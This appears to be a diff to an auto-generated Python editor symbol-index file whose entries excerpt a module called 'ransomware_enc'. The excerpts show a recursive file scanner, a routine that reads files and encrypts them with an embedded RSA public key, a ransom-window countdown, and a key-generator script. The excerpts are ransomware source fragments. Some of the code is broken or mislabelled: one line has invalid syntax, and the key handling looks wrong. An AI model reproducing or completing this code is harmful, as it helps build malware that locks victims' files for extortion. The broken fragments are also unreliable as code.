@@ -1,10 +1,69 @@
 [
     {
+        "label": "base64",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "base64",
+        "description": "base64",
+        "detail": "base64",
+        "documentation": {}
+    },
+    {
         "label": "RSA",
         "importPath": "Crypto.PublicKey",
         "description": "Crypto.PublicKey",
         "isExtraImport": true,
         "detail": "Crypto.PublicKey",
+        "documentation": {}
+    },
+    {
+        "label": "RSA",
+        "importPath": "Crypto.PublicKey",
+        "description": "Crypto.PublicKey",
+        "isExtraImport": true,
+        "detail": "Crypto.PublicKey",
+        "documentation": {}
+    },
+    {
+        "label": "os",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "os",
+        "description": "os",
+        "detail": "os",
+        "documentation": {}
+    },
+    {
+        "label": "tkinter",
+        "kind": 6,
+        "isExtraImport": true,
+        "importPath": "tkinter",
+        "description": "tkinter",
+        "detail": "tkinter",
+        "documentation": {}
+    },
+    {
+        "label": "Path",
+        "importPath": "pathlib",
+        "description": "pathlib",
+        "isExtraImport": true,
+        "detail": "pathlib",
+        "documentation": {}
+    },
+    {
+        "label": "PKCS1_OAEP",
+        "importPath": "Crypto.Cipher",
+        "description": "Crypto.Cipher",
+        "isExtraImport": true,
+        "detail": "Crypto.Cipher",
+        "documentation": {}
+    },
+    {
+        "label": "AES",
+        "importPath": "Crypto.Cipher",
+        "description": "Crypto.Cipher",
+        "isExtraImport": true,
+        "detail": "Crypto.Cipher",
         "documentation": {}
     },
     {
@@ -32,6 +91,51 @@
         "description": "generatePrivate_Public_KEY",
         "peekOfCode": "publicKey = key.publickey().export_key()\n#\nwith open('private.pem', 'wb') as f:\n    f.write(privateKey)\nwith open('public.pem', 'wb') as f:\n    f.write(publicKey)\nprint('Private key saved to private.pem')\nprint('Private key saved to public.pem')\nprint('Done')",
         "detail": "generatePrivate_Public_KEY",
+        "documentation": {}
+    },
+    {
+        "label": "scanRecurse",
+        "kind": 2,
+        "importPath": "ransomware_enc",
+        "description": "ransomware_enc",
+        "peekOfCode": "def scanRecurse(baseDir):\n     for entry in os.scandir(baseDir):\n         if entry.is_file():\n             yield entry\n         else:\n             yield from scanRecurse(entry.path)\n# function for encryption\ndef encrypt(dataFile, publicKey):\n    # read data from file\n    extension = dataFile.suffix.lower()",
+        "detail": "ransomware_enc",
+        "documentation": {}
+    },
+    {
+        "label": "encrypt",
+        "kind": 2,
+        "importPath": "ransomware_enc",
+        "description": "ransomware_enc",
+        "peekOfCode": "def encrypt(dataFile, publicKey):\n    # read data from file\n    extension = dataFile.suffix.lower()\n    dataFile = str(dataFile)\n    with open(dataFile, 'rb') as f:\n        data = f.read()\n    # convert data to bytes\n    data = bytes(data)\n    # create public key object\n    key = RSA.import_key(publicKey)",
+        "detail": "ransomware_enc",
+        "documentation": {}
+    },
+    {
+        "label": "countdown",
+        "kind": 2,
+        "importPath": "ransomware_enc",
+        "description": "ransomware_enc",
+        "peekOfCode": "def countdown(count):\n    # Create Ransomware window\n    hour, minute, second = count.split(':')\n    hour = int(hour)\n    minute = int(minute)\n    second = int(second)\n    label['text' = ''",
+        "detail": "ransomware_enc",
+        "documentation": {}
+    },
+    {
+        "label": "pubKey",
+        "kind": 5,
+        "importPath": "ransomware_enc",
+        "description": "ransomware_enc",
+        "peekOfCode": "pubKey = '''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFsYkkyRGF1eVlacTN5K0ZGUU1yZQpBTnJWUzJneis4akN1WC9yWTlEd3Fvb1hjQXN6aXB5UHo1WVo4WjR6L21BaVdKSF\nhiN3V4WExmRnFsZWlSU0tYCkQ1cnRlZmFPb0w2S0R3a0ZhTTZRSWd5bE9kZitJRVlTS0F6SjFwM1dSVXR6djV3MlVBRTBkNVI2aGdYVzZxVmUKbzRJZkhOV0V4eHRNYitVeU5YUU1wYzFWV3pnSWJ3MExKL0J2YXFxYmpqTUdjL2tqbDYxUFk3U09uYV\nJiWXRMYgpEVDd4bm11Zk9YbUtWdFlMQWxlN3FnYzlHSVk5L1hNR3ZGMk9QUkVJOTRQYWtIUk8yVUMvSW14K3cxaThDUkdaCmptby93MkVPTEdOWmxubmJURk5OcitTaytIMk04Uk9mdmQ3dUk1T1Z3d0d2eHlsdWJvaU94bUxham1ESGl5dGMKa3dJRE\nFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''\npubKey = base64.b64encode(pubKey)\n# function for directory scan\ndef scanRecurse(baseDir):\n     for entry in os.scandir(baseDir):\n         if entry.is_file():\n             yield entry",
+        "detail": "ransomware_enc",
+        "documentation": {}
+    },
+    {
+        "label": "pubKey",
+        "kind": 5,
+        "importPath": "ransomware_enc",
+        "description": "ransomware_enc",
+        "peekOfCode": "pubKey = base64.b64encode(pubKey)\n# function for directory scan\ndef scanRecurse(baseDir):\n     for entry in os.scandir(baseDir):\n         if entry.is_file():\n             yield entry\n         else:\n             yield from scanRecurse(entry.path)\n# function for encryption\ndef encrypt(dataFile, publicKey):",
+        "detail": "ransomware_enc",
         "documentation": {}
     }
 ]
